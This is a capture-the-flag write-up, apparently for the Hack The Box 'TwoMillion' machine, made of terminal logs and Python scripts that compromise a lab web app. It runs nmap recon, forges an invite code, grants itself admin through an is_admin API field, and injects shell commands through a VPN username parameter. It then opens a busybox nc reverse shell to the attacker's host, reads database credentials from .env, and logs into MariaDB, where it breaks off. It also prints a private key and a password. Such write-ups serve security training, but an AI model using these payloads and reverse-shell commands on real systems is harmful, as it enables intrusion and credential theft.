
``` bash

#!/bin/bash

ip=$1
current_dir=$(pwd)

if [ $# -ne 1 ]; then
    echo "Usage: $0 <ip>"
    exit 1
fi

sleep 2

nmap -p- -sS -Pn --min-rate 5000 "$ip" -oN "$current_dir"/all_ports.txt 2>/dev/null

echo -e "\e[32m[*] First script done\e[0m"

sleep 2

ports=$(grep "^[0-9]" "$current_dir"/all_ports.txt | cut -d "/" -f1 | paste -sd "," -)

sleep 1

echo -e "\e[32m[*] Open ports = '$ports'\e[0m"

sleep 1

nmap -p "$ports" -sCV -Pn --min-rate 5000 "$ip" -oN "$current_dir"/version_ports.txt 2>/dev/null

echo -e "\e[32m[*] Done\e[0m"

```

``` bash

❯ recon 10.129.229.66
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-30 01:08 +0200
Nmap scan report for 10.129.229.66
Host is up (0.039s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.48 seconds
[*] First script done
[*] Open ports = '22,80'
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-30 01:08 +0200
Nmap scan report for 10.129.229.66
Host is up (0.036s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.57 seconds
[*] Done
╭─ ~/hacking/ctf/htb/easy/twomillion/recon                                                                   ✔ │ 28s ─╮
╰─                                                                                                                   ─╯

```

``` bash

❯ echo '10.129.229.66 2million.htb' | sudo tee -a /etc/hosts
10.129.229.66 2million.htb
╭─ ~/hacking/ctf/htb/easy/twomillion/recon                                                                         ✔ ─╮
╰─                                                                                                                   ─╯

```

<img width="955" height="592" alt="image" src="https://github.com/user-attachments/assets/1a73ba85-b5a7-4e37-af1d-59fbf6d9fc23" />


<img width="593" height="535" alt="image" src="https://github.com/user-attachments/assets/2b9f3eb8-9939-47d2-981d-aef20f6264b9" />

<img width="581" height="115" alt="image" src="https://github.com/user-attachments/assets/a823e887-8621-43b8-b1da-0aa44770ca04" />

<img width="955" height="216" alt="image" src="https://github.com/user-attachments/assets/9bf01eba-c359-458a-8af2-fb3049a58557" />

``` js

eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))

```

<img width="895" height="765" alt="image" src="https://github.com/user-attachments/assets/feadf8ea-ff09-4883-909d-5ec62ebc27d6" />



``` js

function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

```

``` python

import requests


url = "http://2million.htb/api/v1/invite/how/to/generate"

session = requests.Session()
session.cookies.set("session" ,"qjvqi985nqh19n0nm1bkk032dh")

try:
     r = session.post(url)
     print(r.status_code)
     print(r.text)

except Exception as e:
       print(f"Error:{e}")

```

``` bash

❯ python3 generate.py
200
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

``` python

import codecs

texto = "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr"

print(codecs.decode(texto, "rot_13"))

```

``` bash

❯ python3 rot13.py
/home/joel/hacking/ctf/htb/easy/twomillion/scripts/rot13.py:3: SyntaxWarning: invalid escape sequence '\/'
  texto = "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr"
In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

``` python

import requests


url = "http://2million.htb/api/v1/invite/generate"

session = requests.Session()
session.cookies.set("session" ,"qjvqi985nqh19n0nm1bkk032dh")

try:
     r = session.post(url)
     print(r.status_code)
     print(r.text)

except Exception as e:
       print(f"Error:{e}")

```
``` bash

❯ python3 create.py
200
{"0":200,"success":1,"data":{"code":"U1dOV1EtWjZJMVotUU01NUctQzgyVTM=","format":"encoded"}}
╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

``` bash

❯ echo 'U1dOV1EtWjZJMVotUU01NUctQzgyVTM=' | base64 -d
SWNWQ-Z6I1Z-QM55G-C82U3%                                                                                                ╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

<img width="428" height="565" alt="image" src="https://github.com/user-attachments/assets/b8868dd2-f2bf-4cb3-9de3-b187e8135829" />

<img width="484" height="442" alt="image" src="https://github.com/user-attachments/assets/040991c3-6051-4230-9690-a262f0fb7598" />

<img width="956" height="925" alt="image" src="https://github.com/user-attachments/assets/e003ead3-1af1-4397-8175-ad00a32d1840" />

<img width="552" height="528" alt="image" src="https://github.com/user-attachments/assets/36f9c058-02e0-41de-a503-fe4eb4165a8c" />


``` python

import requests

url = "http://2million.htb/api/v1/admin/settings/update"

session = requests.Session()

session.cookies.set("PHPSESSID", "qjvqi985nqh19n0nm1bkk032dh")
try:
    r = session.put(url)
    print(r.status_code)
    print(r.json())
except Exception as e:
    print(f"Error:{e}")

```

``` bash

❯ python3 request.py
200
{'status': 'danger', 'message': 'Invalid content type.'}
╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
╰─
                                                                                                                 ─╯
```

``` python
import requests

url = "http://2million.htb/api/v1/admin/settings/update"

session = requests.Session()

session.cookies.set("PHPSESSID", "qjvqi985nqh19n0nm1bkk032dh")
try:
    r = session.put(url, json={"email": "test@test.com"})
    print(r.status_code)
    print(r.json())
except Exception as e:
    print(f"Error:{e}")

```

``` bash

❯ python3 request.py
200
{'status': 'danger', 'message': 'Missing parameter: is_admin'}
╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

``` python
import requests

url = "http://2million.htb/api/v1/admin/settings/update"

session = requests.Session()

session.cookies.set("PHPSESSID", "qjvqi985nqh19n0nm1bkk032dh")
try:
    r = session.put(url, json={"email":"test@test.com", "is_admin":"true"})
    print(r.status_code)
    print(r.json())
except Exception as e:
    print(f"Error:{e}")

```

``` bash

❯ python3 request.py
200
{'status': 'danger', 'message': 'Variable is_admin needs to be either 0 or 1.'}
╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```
``` python3
import requests

url = "http://2million.htb/api/v1/admin/settings/update"

session = requests.Session()

session.cookies.set("PHPSESSID", "qjvqi985nqh19n0nm1bkk032dh")
try:
    r = session.put(url, json={"email":"test@test.com", "is_admin":1})
    print(r.status_code)
    print(r.json())
except Exception as e:
    print(f"Error:{e}")

```


``` bash

❯ python3 request.py
200
{'id': 13, 'username': 'test', 'is_admin': 1}
╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

``` bash

❯ curl -i -X GET http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=qjvqi985nqh19n0nm1bkk032dh"
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 30 Jul 2026 00:44:03 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

{"message":true}                                                                                                       ╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

``` python

import requests

url = "http://2million.htb/api/v1/admin/vpn/generate"

session = requests.Session()
session.cookies.set("PHPSESSID", "qjvqi985nqh19n0nm1bkk032dh")

try:
    r = session.post(url)
    print(r.status_code)
    print(r.text)
except Exception as e:
    print(f"Error:{e}")

```

``` bash

❯ python3 vpn.py
200
{"status":"danger","message":"Missing parameter: username"}
╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

``` python

import requests

url = "http://2million.htb/api/v1/admin/vpn/generate"

session = requests.Session()
session.cookies.set("PHPSESSID", "qjvqi985nqh19n0nm1bkk032dh")

try:
    r = session.post(url, json={"username":"test"})
    print(r.status_code)
    print(r.text)
except Exception as e:
    print(f"Error:{e}")

```

``` bash

❯ python3 vpn.py
200
client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
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
2iX/ag==
-----END CERTIFICATE-----
</ca>
<cert>
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 2 (0x2)
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=UK, ST=London, L=London, O=HackTheBox, OU=VPN, CN=2million/emailAddress=info@hackthebox.eu
        Validity
            Not Before: Jul 30 00:47:20 2026 GMT
            Not After : Jul 30 00:47:20 2027 GMT
        Subject: C=GB, ST=London, L=London, O=test, CN=test
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:e6:94:5d:22:69:43:d5:b9:33:2d:e6:99:34:a4:
                    a7:65:4a:71:4b:20:50:30:f2:f9:79:b6:41:0d:ab:
                    14:a4:d8:63:d5:7a:9a:7f:1a:32:db:67:fe:3b:05:
                    20:bf:94:37:00:b5:82:d4:46:44:ff:55:f5:f2:54:
                    5d:3e:25:cf:83:19:9d:73:c5:5a:b7:26:83:23:77:
                    87:95:4a:f0:c3:99:2f:d2:af:7e:0a:42:5c:41:7f:
                    18:ec:cc:21:91:67:7c:04:ee:a9:56:43:e9:54:25:
                    6e:b9:4a:65:53:67:20:63:40:51:1f:f1:0c:82:d8:
                    1b:24:cb:89:0c:8c:02:19:f2:de:ec:e0:e2:23:3b:
                    76:d4:09:6c:17:d1:6b:65:7c:81:9d:37:94:82:0e:
                    23:56:95:b9:9a:d3:fe:ff:dc:65:25:53:10:6f:00:
                    3a:84:b2:e1:e9:28:b5:f2:0f:0d:bc:ed:45:63:7b:
                    48:4f:51:8f:8a:73:f9:7f:76:07:1a:07:62:3f:84:
                    68:1f:2c:79:5f:9b:3d:44:1c:f3:a1:6f:7d:81:2a:
                    e4:7f:7c:74:ed:6a:19:64:8c:49:c4:a4:bd:ed:1e:
                    cb:53:63:d8:2c:6d:11:d6:61:e3:6c:50:cc:8f:36:
                    69:a4:3f:eb:96:21:68:98:14:31:3f:cc:f0:6e:20:
                    10:87
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier:
                52:59:FE:18:FF:AD:94:F3:B9:74:4D:17:5D:78:EB:75:1F:67:39:54
            X509v3 Authority Key Identifier:
                7A:62:DD:1D:B6:FE:4A:C8:E3:F8:9F:FA:AC:F4:15:0C:96:BA:2E:91
            X509v3 Basic Constraints:
                CA:FALSE
            X509v3 Key Usage:
                Digital Signature, Non Repudiation, Key Encipherment, Data Encipherment, Key Agreement, Certificate Sign, CRL Sign
            Netscape Comment:
                OpenSSL Generated Certificate
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        5c:fe:76:8f:78:84:9e:0b:ed:e4:08:01:ee:b7:c8:ca:a2:5e:
        25:1d:5a:ec:e1:15:38:9e:a0:c6:6c:b9:f6:2e:cd:db:17:fc:
        37:d7:f3:a8:0a:0e:2c:f5:c3:44:59:82:ee:34:7c:11:79:a7:
        9c:08:a7:a5:8b:22:7f:7f:1e:c4:89:84:46:09:44:72:1a:9a:
        3d:35:18:dd:8d:85:c8:ec:52:2b:3c:34:18:9b:1c:0c:3a:ec:
        af:39:d0:d4:42:b5:4c:67:d5:75:96:17:84:9e:06:f6:c0:f7:
        1b:0d:06:d2:62:58:4c:c7:f1:7c:b3:f9:68:fc:89:64:e3:31:
        73:d6:04:e7:ee:aa:f6:12:b5:8d:16:0e:0b:fc:ad:d1:80:a7:
        cc:2e:46:42:2a:85:76:31:8f:fb:9b:5b:4a:86:3b:d3:d0:98:
        6e:c5:8d:f0:d7:ea:31:cd:11:08:f0:75:13:d8:8f:a6:c0:a8:
        ae:41:02:b7:48:68:12:ba:26:7c:c9:84:e9:5e:4b:9f:80:0a:
        f8:a2:f3:7e:df:57:2d:62:00:96:d6:cd:44:b3:b3:4e:51:b4:
        70:c7:4d:30:45:98:83:7c:75:32:4f:a1:cb:b9:aa:f5:a8:44:
        54:95:6f:29:6f:75:02:f9:43:fa:cb:f8:8b:41:15:93:8e:b0:
        ce:9e:98:33:8f:21:4c:0e:04:61:57:e7:a2:79:22:79:81:30:
        76:3c:56:e6:ed:58:a0:56:d4:21:a8:67:6d:95:bf:34:b0:1f:
        d3:5d:b1:92:61:d4:74:2d:d6:7e:40:8d:aa:88:d0:c2:9b:6e:
        b3:f9:1d:51:8c:e8:ba:45:ab:91:65:9c:ae:ff:9e:d8:e0:07:
        e5:e0:5b:27:85:7e:6d:cf:d6:6b:af:50:e1:70:13:d0:e7:25:
        d6:9a:ec:f1:a4:54:cf:bb:88:7a:58:14:89:08:c2:6c:35:34:
        eb:54:8e:e7:29:44:78:93:93:e4:32:ec:92:a7:c4:38:40:c8:
        31:1c:4d:3f:0f:44:c1:c9:63:d7:6a:98:ce:3d:d8:38:b2:2f:
        d3:ea:e3:f2:2b:df:92:28:c3:a8:33:e2:f1:5a:0e:5d:e3:51:
        4d:45:72:45:37:6d:7d:75:20:78:83:d3:7c:ed:a7:37:fd:45:
        38:28:9e:2e:3f:37:67:9a:b3:bd:77:04:0b:b5:b0:26:b9:3c:
        85:25:9a:e2:c1:e3:82:06:49:de:b8:58:13:60:11:2b:4a:27:
        87:c5:16:43:b5:2d:c0:27:2e:df:26:1b:08:e1:f5:f8:a9:e8:
        92:21:27:15:4b:29:f2:7c:5c:5c:7b:8a:1c:72:ec:3c:5c:18:
        93:28:e0:6c:88:f5:e7:c1
-----BEGIN CERTIFICATE-----
MIIE2zCCAsOgAwIBAgIBAjANBgkqhkiG9w0BAQsFADCBiDELMAkGA1UEBhMCVUsx
DzANBgNVBAgMBkxvbmRvbjEPMA0GA1UEBwwGTG9uZG9uMRMwEQYDVQQKDApIYWNr
VGhlQm94MQwwCgYDVQQLDANWUE4xETAPBgNVBAMMCDJtaWxsaW9uMSEwHwYJKoZI
hvcNAQkBFhJpbmZvQGhhY2t0aGVib3guZXUwHhcNMjYwNzMwMDA0NzIwWhcNMjcw
NzMwMDA0NzIwWjBNMQswCQYDVQQGEwJHQjEPMA0GA1UECAwGTG9uZG9uMQ8wDQYD
VQQHDAZMb25kb24xDTALBgNVBAoMBHRlc3QxDTALBgNVBAMMBHRlc3QwggEiMA0G
CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDmlF0iaUPVuTMt5pk0pKdlSnFLIFAw
8vl5tkENqxSk2GPVepp/GjLbZ/47BSC/lDcAtYLURkT/VfXyVF0+Jc+DGZ1zxVq3
JoMjd4eVSvDDmS/Sr34KQlxBfxjszCGRZ3wE7qlWQ+lUJW65SmVTZyBjQFEf8QyC
2Bsky4kMjAIZ8t7s4OIjO3bUCWwX0WtlfIGdN5SCDiNWlbma0/7/3GUlUxBvADqE
suHpKLXyDw287UVje0hPUY+Kc/l/dgcaB2I/hGgfLHlfmz1EHPOhb32BKuR/fHTt
ahlkjEnEpL3tHstTY9gsbRHWYeNsUMyPNmmkP+uWIWiYFDE/zPBuIBCHAgMBAAGj
gYkwgYYwHQYDVR0OBBYEFFJZ/hj/rZTzuXRNF11463UfZzlUMB8GA1UdIwQYMBaA
FHpi3R22/krI4/if+qz0FQyWui6RMAkGA1UdEwQCMAAwCwYDVR0PBAQDAgH+MCwG
CWCGSAGG+EIBDQQfFh1PcGVuU1NMIEdlbmVyYXRlZCBDZXJ0aWZpY2F0ZTANBgkq
hkiG9w0BAQsFAAOCAgEAXP52j3iEngvt5AgB7rfIyqJeJR1a7OEVOJ6gxmy59i7N
2xf8N9fzqAoOLPXDRFmC7jR8EXmnnAinpYsif38exImERglEchqaPTUY3Y2FyOxS
Kzw0GJscDDrsrznQ1EK1TGfVdZYXhJ4G9sD3Gw0G0mJYTMfxfLP5aPyJZOMxc9YE
5+6q9hK1jRYOC/yt0YCnzC5GQiqFdjGP+5tbSoY709CYbsWN8NfqMc0RCPB1E9iP
psCorkECt0hoEromfMmE6V5Ln4AK+KLzft9XLWIAltbNRLOzTlG0cMdNMEWYg3x1
Mk+hy7mq9ahEVJVvKW91AvlD+sv4i0EVk46wzp6YM48hTA4EYVfnonkieYEwdjxW
5u1YoFbUIahnbZW/NLAf012xkmHUdC3WfkCNqojQwptus/kdUYzoukWrkWWcrv+e
2OAH5eBbJ4V+bc/Wa69Q4XAT0Ocl1prs8aRUz7uIelgUiQjCbDU061SO5ylEeJOT
5DLskqfEOEDIMRxNPw9Ewclj12qYzj3YOLIv0+rj8ivfkijDqDPi8VoOXeNRTUVy
RTdtfXUgeIPTfO2nN/1FOCieLj83Z5qzvXcEC7WwJrk8hSWa4sHjggZJ3rhYE2AR
K0onh8UWQ7UtwCcu3yYbCOH1+KnokiEnFUsp8nxcXHuKHHLsPFwYkyjgbIj158E=
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDmlF0iaUPVuTMt
5pk0pKdlSnFLIFAw8vl5tkENqxSk2GPVepp/GjLbZ/47BSC/lDcAtYLURkT/VfXy
VF0+Jc+DGZ1zxVq3JoMjd4eVSvDDmS/Sr34KQlxBfxjszCGRZ3wE7qlWQ+lUJW65
SmVTZyBjQFEf8QyC2Bsky4kMjAIZ8t7s4OIjO3bUCWwX0WtlfIGdN5SCDiNWlbma
0/7/3GUlUxBvADqEsuHpKLXyDw287UVje0hPUY+Kc/l/dgcaB2I/hGgfLHlfmz1E
HPOhb32BKuR/fHTtahlkjEnEpL3tHstTY9gsbRHWYeNsUMyPNmmkP+uWIWiYFDE/
zPBuIBCHAgMBAAECggEADrb5zpVgfTDUIaIYCt0AdcgEvOJIsScAYWe5H7yC6muI
y3nchtn5fuOpvMMnWN0w5BGxUgdTUJGAIEE0BiBMQuCNRMhxG+5llguDEor1cctt
MDPU26YVKcozoVZRmhbm5OWvgXrUrB22GDW1i6yxdhlc/qiCajiNBZHGTY+tyVFb
LQvXKmCQXVEymY6Ui8WL4hAFrKgPXVC1d6CaQ7KGBQnuStfcFcSeo2CIw7WhP/FR
HqjO9s1C6ZDu4H9vjvatQ5fvKvnBSy16H3vKnnNvnB/5/N553TTCJ+koJwW40g3b
PABLw2TrIj/4CIvwzv+xo/RriCcbx9PNcjmpwik6OQKBgQDwhK5O7GGtX1W7VaXN
fHPgFNbwr6Wagik9t7gEVp/dELr+o54sQLzxmheSPTTx/aNXY7QUcuJ474mLZbde
3O7VtyWVR7SyQmr6aSDJR+lzwFz/CHiZVuNgvv5lAY+cQ6FFDYhaUdw80h07El79
yg5c+Jaj3tbTsqoV/VmQvUjpPQKBgQD1a+jycYbXzoDPS/vJBXMoQla9cpxbiCwV
hhDoIw6ZxsdnvzafHFsIUt8u/rVIb6kwVOev79gUqC/1L0q453Lr7AIGDzbg/U/t
1lvUhMZykj+4KJ4feAFx/W62qPlaEgk/uh+nK0KDKzY3FOGLgRSrBYN7311wNwhg
37ZmSrPVEwKBgQDIeL7U97/egyTxNU0yfjYTIyuYh77PjwgS8ivGKfGrkANctUHk
fr0934MgGDYmMZPRBkCV/r/3ryiE8O4repjzt2jzCUZ6glOqjq+ONYtHOKIKzKPA
o6R4AhoGVIu/4rrr1IC/T5Xzd+p3TzOv85ePNIBS7C1BXJzaIUZjFvJLvQKBgGR/
pOuq65Hx4TOCJQADeE2zJLv9c+PTlmHV/ZRhzrfP+5YTajWrsedtsDEZYnjgKMM+
8YVNTQngeYsIq6ueM6RCh+2dS1bExHdbgU08ddsy4l7yWxX92XGpWy33ceydWCY9
fHrDL0BxcIkLxvSOjj0eS+Js7GFoV8j7s0CeNJf7AoGBAIvREQaevFFWzEazUdQd
LZIcJAi1xTW3RBJTICXqnF7ektjoIXw2pQYf3A0tkxU03hgl9u0EuxSBJ1OHMK1h
zySC5nLd2thSB2FxqBIWIZPt+/FEjkcdiOG9GMwrKWxYp7ikGmKrZX7um/DuKwHt
lrWBFnHyQxpR226NRidxc/AS
-----END PRIVATE KEY-----
</key>
<tls-auth>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
45df64cdd950c711636abdb1f78c058c
358730b4f3bcb119b03e43c46a856444
05e96eaed55755e3eef41cd21538d041
079c0fc8312517d851195139eceb458b
f8ff28ba7d46ef9ce65f13e0e259e5e3
068a47535cd80980483a64d16b7d10ca
574bb34c7ad1490ca61d1f45e5987e26
7952930b85327879cc0333bb96999abe
2d30e4b592890149836d0f1eacd2cb8c
a67776f332ec962bc22051deb9a94a78
2b51bafe2da61c3dc68bbdd39fa35633
e511535e57174665a2495df74f186a83
479944660ba924c91dd9b00f61bc09f5
2fe7039aa114309111580bc5c910b4ac
c9efb55a3f0853e4b6244e3939972ff6
bfd36c19a809981c06a91882b6800549
-----END OpenVPN Static key V1-----
</tls-auth>

╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

``` python3

import requests

url = "http://2million.htb/api/v1/admin/vpn/generate"

session = requests.Session()
session.cookies.set("PHPSESSID", "qjvqi985nqh19n0nm1bkk032dh")

try:
    comando = input("")
    r = session.post(url, json={"username":f";{comando};"})
    print(r.status_code)
    print(r.text)
except Exception as e:
    print(f"Error:{e}")

```

``` bash

❯ python3 injection.py
id
200
uid=33(www-data) gid=33(www-data) groups=33(www-data)

╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

``` bash

❯ python3 injection.py
busybox nc 10.10.15.242 4444 -e sh

```

``` bash

❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.242] from (UNKNOWN) [10.129.229.66] 52250
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@2million:~/html$ ^Z
[1]  + 2813 suspended  nc -lvnp 4444
❯ stty raw -echo; fg
[1]  + 2813 continued  nc -lvnp 4444

www-data@2million:~/html$
www-data@2million:~/html$ export TERM=xterm
www-data@2million:~/html$

```

``` bash

www-data@2million:~/html$ ls -la
total 56
drwxr-xr-x 10 root root 4096 Jul 30 01:00 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 Jul 30 01:00 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
www-data@2million:~/html$

```

``` bash

www-data@2million:~/html$ mysql -u admin -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 72288
Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

